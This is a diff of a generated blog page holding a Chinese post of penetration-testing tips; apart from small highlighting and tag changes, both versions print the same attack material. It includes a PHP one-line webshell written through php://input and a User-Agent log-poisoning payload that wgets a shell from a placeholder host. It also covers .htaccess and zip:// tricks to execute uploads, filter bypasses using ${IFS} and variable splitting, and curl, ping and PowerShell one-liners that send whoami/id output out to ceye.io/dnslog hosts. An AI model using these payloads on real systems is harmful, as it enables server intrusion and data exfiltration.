@@ -94,7 +94,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="渗透测试,PHP,webshell,linux,命令执行,文件包含," />
+  <meta name="keywords" content="渗透测试,PHP,webshell,命令执行,linux,文件包含," />
 
 
 
@@ -113,7 +113,7 @@
 
 
 <meta name="description" content="结合最近学习的知识，总结一下渗透测试中的一些小技巧，仅做参考。">
-<meta name="keywords" content="渗透测试,PHP,webshell,linux,命令执行,文件包含">
+<meta name="keywords" content="渗透测试,PHP,webshell,命令执行,linux,文件包含">
 <meta property="og:type" content="article">
 <meta property="og:title" content="渗透测试的一些小技巧">
 <meta property="og:url" content="http://byd.dropsec.xyz/2016/11/20/渗透测试小技巧/index.html">
@@ -461,7 +461,7 @@
 <a id="more"></a>
 <h1 id="0x01-PHP文件包含"><a href="#0x01-PHP文件包含" class="headerlink" title="0x01 PHP文件包含"></a>0x01 PHP文件包含</h1><p><strong>利用网站文件上传功能:</strong>，比如上传头像之类，可以尝试包含上传的文件。</p>
 <p><strong>利用php封装协议<code>php://input</code>和<code>data://</code>:</strong>，包含post数据造成php命令执行.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://example.com/test.php?url=php://input</div><div class="line">POST:&lt;?php fwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&apos;&lt;?php eval($_POST[&quot;pass&quot;]);?&gt;&apos;)?&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">http</span>://example.com/test.php?url=php://input</div><div class="line">POST:<span class="meta">&lt;?</span>php fwrite(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">'&lt;?php eval($_POST["pass"]);?&gt;'</span>)<span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <p><strong>包含log日志文件:</strong>当我们提交恶意代码时也会被记录，结合解析漏洞即可getshell(有读权限)。</p>
 <p>apache日志默认在<code>/etc/httpd/logs/access_log</code>;</p>
 <p>在日志文件中插入PHP代码</p>
@@ -478,10 +478,10 @@
 <pre><code>填写User-Agent字段如下：&lt;?system(&apos;wget http://eyidaima/shell.txt -O shell.php&apos;);?&gt;
 </code></pre><p><strong>包含会话文件:</strong>这需要攻击者能控制会话中的任何字符串值（注入代码，例如<code>phpinfo(）</code>，会话文件必须存放在serializedsession文件且PHP脚本能够访问会话文件（通常是<code>/tmp/sess_SESSIONID</code>文件）。</p>
 <p><strong>包含其他由php应用创建的文件:</strong>只要你能想到的，都可以尝试创建,然后包含他，比如数据库文件，缓存文件，应用程序级别的日志。</p>
-<h1 id="0x02-利用-htaccess文件绕过黑名单"><a href="#0x02-利用-htaccess文件绕过黑名单" class="headerlink" title="0x02 利用.htaccess文件绕过黑名单"></a>0x02 利用<code>.htaccess</code>文件绕过黑名单</h1><p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。自定义<code>.htaccess</code>上传，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;FileMatch “shell.jpg”&gt;  </div><div class="line">SetHandler application/x-httpd-php  </div><div class="line">&lt;/FileMatch&gt;</div></pre></td></tr></table></figure></p>
+<h1 id="0x02-利用-htaccess文件绕过黑名单"><a href="#0x02-利用-htaccess文件绕过黑名单" class="headerlink" title="0x02 利用.htaccess文件绕过黑名单"></a>0x02 利用<code>.htaccess</code>文件绕过黑名单</h1><p><code>.htaccess</code>文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。自定义<code>.htaccess</code>上传，内容如下：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="section">&lt;FileMatch “shell.jpg”&gt;</span>  </div><div class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php  </div><div class="line"><span class="section">&lt;/FileMatch&gt;</span></div></pre></td></tr></table></figure></p>
 <p>同目录下，上传一个shell.jpg文件，内容是一句话，这个时候就成功绕过。</p>
 <h1 id="0x03-PHP流封装绕过截断"><a href="#0x03-PHP流封装绕过截断" class="headerlink" title="0x03 PHP流封装绕过截断"></a>0x03 PHP流封装绕过截断</h1><p>技巧来源：王松</p>
-<p>假设存在文件包含的代码为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php    </div><div class="line">$a = $_GET[&apos;file&apos;];</div><div class="line">include $a.&apos;.html.php&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>假设存在文件包含的代码为：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span>    </span></div><div class="line"><span class="php">$a = $_GET[<span class="string">'file'</span>];</span></div><div class="line"><span class="php"><span class="keyword">include</span> $a.<span class="string">'.html.php'</span>;</span></div><div class="line"><span class="php"><span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure></p>
 <p>但是我们<code>%00</code>无法截断, 只能包含<code>xxxx.html.php</code> 首先我们新建一个<code>hello.html.php</code>，内容为<code>phpinfo()</code>;</p>
 <p>然后压缩成zip</p>
 <p>然后访问如下网址,即可成功包含压缩文件内的<code>hello.html.php</code></p>
@@ -489,10 +489,10 @@
 <p>把我们输入的变量和include后面的变量合起来就是<code>zip://test.zip#hello.html.php</code></p>
 <p>代表当前目录下的<code>test.zip</code>压缩包里面的<code>hello.html.php</code>,于是就包含成功。</p>
 <h1 id="0x04-通用防注入系统getshell"><a href="#0x04-通用防注入系统getshell" class="headerlink" title="0x04 通用防注入系统getshell"></a>0x04 通用防注入系统getshell</h1><p>很多人渗透测试的时候，发现防注入系统，比如说记录了ip，时间，提交数据等等，通过阅读类似程序的源码得知数据记录在<code>sqlin.asp</code>。</p>
-<p>提交如下数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">┼攠數畣整爠煥敵瑳∨≡┩愾           密码 a  (加密方式是:ANSI-&gt;Unicode；工具：UNICODE2ANSI)</div><div class="line"></div><div class="line">提交 and 1= ┼攠數畣整爠煥敵瑳∨≡┩愾</div></pre></td></tr></table></figure></p>
+<p>提交如下数据：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">┼攠數畣整爠煥敵瑳∨≡┩愾           密码 a  (加密方式是<span class="symbol">:ANSI-&gt;Unicode</span>；工具：UNICODE2ANSI)</div><div class="line"></div><div class="line">提交 <span class="keyword">and</span> <span class="number">1</span>= ┼攠數畣整爠煥敵瑳∨≡┩愾</div></pre></td></tr></table></figure></p>
 <p>菜刀连接<code>sqlin.asp</code>即可。</p>
 <h1 id="0x05-iis-php黑名单上传突破"><a href="#0x05-iis-php黑名单上传突破" class="headerlink" title="0x05 iis+php黑名单上传突破"></a>0x05 iis+php黑名单上传突破</h1><p>技巧来源：P牛</p>
-<p>在php+window+iis环境下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">双引号==点号;</div><div class="line">大于符号==问号;</div><div class="line">小于符号(“&lt;”)==星号(“*”);</div></pre></td></tr></table></figure></p>
+<p>在php+window+iis环境下:<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">双引号==点号<span class="comment">;</span></div><div class="line">大于符号==问号<span class="comment">;</span></div><div class="line">小于符号(“&lt;”)==星号(“*”)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
 <p>该特性只能用于文件上传时覆盖已知的文件，于是这特性便略显鸡肋.不过P牛已经给出完美利用的方法：</p>
 <p><strong>思路如下：</strong></p>
 <ol>
@@ -508,16 +508,16 @@
 <ol>
 <li>escapeshellcmd：<code>escapeshellcmd()</code>对字符串中可能会欺骗 shell命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到<code>exec()</code>或<code>system()</code>函数，或者执行操作符之前进行转义为<code>^</code>,利用<code>%1a</code>，可以绕过过滤执行命令。</li>
 <li><p>黑名单绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">执行ls命令：</div><div class="line">a=l;b=s;$a$b</div><div class="line">cat hello文件内容：</div><div class="line">a=c;b=at;c=he;d=llo;$a$b $&amp;#123;c&amp;#125;$&amp;#123;d&amp;#125;</div></pre></td></tr></table></figure>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">执行ls命令：</div><div class="line">a=l;b=s;$a$b</div><div class="line">cat hello文件内容：</div><div class="line">a=c;b=at;c=he;d=llo;$a$b $&amp;#123;c&amp;#125;$&amp;#123;d&amp;#125;</div></pre></td></tr></table></figure>
 </li>
 <li><p>空格绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">绕过空格</div><div class="line">$&amp;#123;IFS&amp;#125;</div><div class="line">cat$&amp;#123;IFS&amp;#125;hello</div><div class="line">或者在读取文件的时候利用重定向符</div><div class="line">&lt;&gt;</div><div class="line">cat&lt;&gt;hello</div></pre></td></tr></table></figure>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">绕过空格</div><div class="line">$&amp;#<span class="number">123</span>;IFS&amp;#<span class="number">125</span>;</div><div class="line">cat$&amp;#<span class="number">123</span>;IFS&amp;#<span class="number">125</span>;hello</div><div class="line">或者在读取文件的时候利用重定向符</div><div class="line">&lt;&gt;</div><div class="line">cat&lt;&gt;hello</div></pre></td></tr></table></figure>
 </li>
 <li><p>无回显<br>无回显获取数据的需求还是挺大的，比如sql，xxe，xss等等，这个时候一般可以用dns/http通道来获取数据。<br><strong>linux：</strong></p>
 </li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">curl xxxx.ceye.io/`whoami`</div><div class="line">ping -c 1 `whoami`.xxxx.ceye.io</div><div class="line">特殊字符或者是空格出现的话，这时候可以通过一些编码来，比如base64</div><div class="line">curl http://xxxx.ceye.io/$(id|base64)</div></pre></td></tr></table></figure>
-<p><strong>windows:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">http请求：</div><div class="line">for /F %x in (&apos;whoami&apos;) do start http://xxx.ceye.io/%x</div><div class="line">dns请求：</div><div class="line">获取计算机名：for /F &quot;delims=\&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.xxx.dnslog.info</div><div class="line">获取用户名：for /F &quot;delims=\ tokens=2&quot; %i in (&apos;whoami&apos;) do ping -n 1 %i.xxx.dnslog.info</div><div class="line">用powershell来base64数据</div><div class="line">for /F %x in (&apos;whoami&apos;) do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(&apos;%x&apos;));$b=New-Object System.Net.WebClient;$b.DownloadString(&apos;http://xxx.ceye.io/&apos;+$a);</div></pre></td></tr></table></figure></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">curl xxxx<span class="selector-class">.ceye</span><span class="selector-class">.io</span>/`whoami`</div><div class="line">ping -c <span class="number">1</span> `whoami`<span class="selector-class">.xxxx</span><span class="selector-class">.ceye</span><span class="selector-class">.io</span></div><div class="line">特殊字符或者是空格出现的话，这时候可以通过一些编码来，比如base64</div><div class="line">curl http:<span class="comment">//xxxx.ceye.io/$(id|base64)</span></div></pre></td></tr></table></figure>
+<p><strong>windows:</strong><br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">http请求：</div><div class="line"><span class="keyword">for</span> /F <span class="meta">%x</span> <span class="keyword">in</span> (<span class="string">'whoami'</span>) do <span class="keyword">start</span> http://xxx.ceye.io/<span class="meta">%x</span></div><div class="line">dns请求：</div><div class="line">获取计算机名：<span class="keyword">for</span> /F <span class="string">"delims=\"</span> <span class="meta">%i</span> <span class="keyword">in</span> (<span class="string">'whoami'</span>) do ping -n <span class="number">1</span> <span class="meta">%i</span>.xxx.dnslog.info</div><div class="line">获取用户名：<span class="keyword">for</span> /F <span class="string">"delims=\ tokens=2"</span> <span class="meta">%i</span> <span class="keyword">in</span> (<span class="string">'whoami'</span>) do ping -n <span class="number">1</span> <span class="meta">%i</span>.xxx.dnslog.info</div><div class="line">用powershell来base64数据</div><div class="line"><span class="keyword">for</span> /F <span class="meta">%x</span> <span class="keyword">in</span> (<span class="string">'whoami'</span>) do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(<span class="string">'%x'</span>));$b=New-Object System.Net.WebClient;$b.DownloadString(<span class="string">'http://xxx.ceye.io/'</span>+$a);</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -589,9 +589,9 @@
           
             <a href="/tags/webshell/" rel="tag"><i class="fa fa-tag"></i> webshell</a>
           
-            <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
-          
             <a href="/tags/命令执行/" rel="tag"><i class="fa fa-tag"></i> 命令执行</a>
+          
+            <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
           
             <a href="/tags/文件包含/" rel="tag"><i class="fa fa-tag"></i> 文件包含</a>
           
@@ -733,7 +733,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">74</span>
+                <span class="site-state-item-count">72</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
